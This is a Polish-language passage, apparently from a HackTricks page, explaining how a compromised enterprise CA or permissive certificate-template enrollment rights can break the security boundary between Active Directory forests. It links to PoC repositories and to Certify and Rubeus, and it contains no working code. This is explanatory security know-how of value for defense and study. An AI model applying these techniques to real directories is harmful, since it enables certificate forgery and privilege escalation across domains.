## Wyjaśnienie Compromising Forests with Certificates w stronie biernej

### Łamanie Forest Trusts przez skompromitowane CA

Konfiguracja **cross-forest enrollment** jest stosunkowo łatwo przeprowadzana. **Root CA certificate** z resource forest jest **publikowany w account forests** przez administratorów, a certyfikaty **enterprise CA** z resource forest są **dodawane do kontenerów `NTAuthCertificates` i AIA w każdym account forest**. Mówiąc dokładniej, taka konfiguracja zapewnia **CA w resource forest pełną kontrolę** nad wszystkimi innymi forests, dla których zarządzana jest infrastruktura PKI. Jeśli to CA zostanie **skompromitowane przez attackerów**, certyfikaty dla wszystkich użytkowników zarówno w resource forest, jak i w account forests, mogłyby zostać **sfałszowane przez attackerów**, co doprowadziłoby do złamania granicy bezpieczeństwa forest.

### Uprawnienia Enrollment przyznane Foreign Principals

W środowiskach multi-forest należy zachować ostrożność w przypadku Enterprise CA, które **publikują certificate templates** zezwalające **Authenticated Users lub foreign principals** (użytkownikom/grupom zewnętrznym wobec forest, do którego należy Enterprise CA) na **enrollment i edycję**.\
Po uwierzytelnieniu przez trust, **Authenticated Users SID** jest dodawany przez AD do tokenu użytkownika. W związku z tym, jeśli domena posiada Enterprise CA z template, który **zezwala Authenticated Users na enrollment**, możliwe byłoby **dokonanie enrollment template przez użytkownika z innego forest**. Analogicznie, jeśli **uprawnienia enrollment zostaną jawnie przyznane foreign principal przez template**, tworzona jest **cross-forest access-control relationship**, umożliwiająca principalowi z jednego forest **dokonanie enrollment template z innego forest**.

Oba scenariusze prowadzą do **zwiększenia attack surface** między jednym forest a drugim. Ustawienia certificate template mogłyby zostać wykorzystane przez attackera do uzyskania dodatkowych uprawnień w foreign domain.


## Referencje

- [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
